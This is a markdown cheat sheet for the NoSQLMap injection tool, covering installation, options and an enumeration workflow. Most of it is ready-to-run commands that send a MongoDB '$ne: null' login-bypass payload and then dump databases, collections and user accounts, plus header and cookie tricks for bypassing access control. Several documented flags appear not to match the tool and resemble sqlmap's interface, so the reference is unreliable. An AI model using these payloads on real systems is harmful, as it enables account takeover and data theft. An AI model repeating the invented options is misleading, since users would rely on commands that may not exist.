# NoSQLMap

**Type:** Automated NoSQL Injection & Security Testing Tool
**Focus:** MongoDB, CouchDB, and other NoSQL databases exploitation, injection discovery, enumeration, and exploitation

---

## 1. Installation & Setup

### Requirements

* Python 3.6+ installed (`python3 --version`)
* Pip package manager
* Git for cloning the repository
* Optional: Virtual environment for isolation

### Installation Steps

1. **Clone Repository**

```bash
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
```

2. **Install Dependencies**

```bash
pip3 install -r requirements.txt
```

3. **Optional: Create Virtual Environment**

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

4. **Verify Installation**

```bash
python3 nosqlmap.py -h
```

* Displays help menu and confirms installation

---

## 2. Supported Databases

| Database    | Notes                                               |
| ----------- | --------------------------------------------------- |
| MongoDB     | Fully supported, injection discovery & exploitation |
| CouchDB     | Supported for injection and enumeration             |
| Redis       | Limited support via command execution               |
| Other NoSQL | Partial support depending on driver behavior        |

---

## 3. Usage Overview

```bash
python3 nosqlmap.py -u <URL> [options]
```

### Key Options

| Option               | Description                         |
| -------------------- | ----------------------------------- |
| `-u <URL>`           | Target URL with injection point     |
| `--data <DATA>`      | POST data payload injection         |
| `--cookie <COOKIE>`  | Cookie-based injection              |
| `--headers <HEADER>` | Custom HTTP headers                 |
| `--technique <T>`    | Injection technique (B, E, T, etc.) |
| `--dbs`              | Enumerate available databases       |
| `--collections`      | Enumerate collections in a database |
| `--columns`          | Enumerate fields in a collection    |
| `--dump`             | Dump data from collection           |
| `--regex <PATTERN>`  | Search fields with regex            |
| `--auth`             | Use basic/authenticated access      |
| `--proxy <PROXY>`    | Route requests through a proxy      |

---

## 4. Injection Techniques

* **Boolean-Based Blind** (`B`)
* **Error-Based** (`E`)
* **Time-Based** (`T`)
* **Stacked Queries** (when supported)
* **Regex Injection** (for enumeration)

**Example: Boolean-Based Blind**

```bash
python3 nosqlmap.py -u "http://target.com/login" --data '{"username": {"$ne": null},"password": "pass"}' --technique B --dbs
```

**Example: Dump Full Collection**

```bash
python3 nosqlmap.py -u "http://target.com/api/login" --data '{"username":{"$ne":null},"password":"pass"}' --dbs
python3 nosqlmap.py -u "http://target.com/api/login" --data '{"username":{"$ne":null},"password":"pass"}' --collections -D users
python3 nosqlmap.py -u "http://target.com/api/login" --data '{"username":{"$ne":null},"password":"pass"}' --dump -D users -C accounts
```

---

## 5. Authentication & Headers

* Pass cookies for authenticated endpoints:

```bash
--cookie "sessionid=abcd1234"
```

* Add custom headers (user-agent, authorization, etc.):

```bash
--headers "User-Agent: Mozilla/5.0" --headers "Authorization: Bearer <token>"
```

* Combine headers + cookies for full access control bypass

---

## 6. Advanced Usage

### Regex Field Extraction

```bash
--regex ".*email.*"
```

* Finds fields matching pattern for targeted dumps

### Proxy Usage

```bash
--proxy http://127.0.0.1:8080
```

* Route requests through BurpSuite / ZAP for inspection or manipulation

### Authenticated API Testing

```bash
--auth basic --user admin --password password123
```

* Works with endpoints requiring basic or token-based authentication

---

## 7. Enumeration Workflow (Professional)

1. Identify injection point in URL, POST data, or headers
2. Verify injection with `--technique` (B/E/T)
3. Enumerate databases: `--dbs`
4. Enumerate collections: `--collections -D <db>`
5. Enumerate fields: `--columns -D <db> -C <collection>`
6. Dump data: `--dump -D <db> -C <collection>`
7. Optional: Regex search for sensitive fields

---

## 8. Output & Reporting

* Data can be exported as JSON (`--dump-json`)
* Logs include injection attempts, databases, collections, and field enumeration
* Integrates with BurpSuite or proxy for live analysis

---

## 9. Tips, Tricks & Best Practices

* Always verify injection points manually before dumping large datasets
* Use regex filters to reduce noise when enumerating large databases
* Combine with proxies for request tampering (headers, tokens, payloads)
* Test multiple injection techniques if one fails
* Avoid dumping sensitive production data outside authorized red team scope

---

## 10. Quick Reference Cheat Sheet

```text
# Basic Enumeration
python3 nosqlmap.py -u <URL> --data '<POST JSON>' --technique B --dbs
python3 nosqlmap.py -u <URL> --data '<POST JSON>' --collections -D <db>
python3 nosqlmap.py -u <URL> --data '<POST JSON>' --columns -D <db> -C <collection>
python3 nosqlmap.py -u <URL> --data '<POST JSON>' --dump -D <db> -C <collection>

# Advanced
--cookie "<cookie>"
--headers "<Header>: <Value>"
--auth basic --user <user> --password <pass>
--proxy http://127.0.0.1:8080
--regex "<pattern>"
--dump-json
```

---
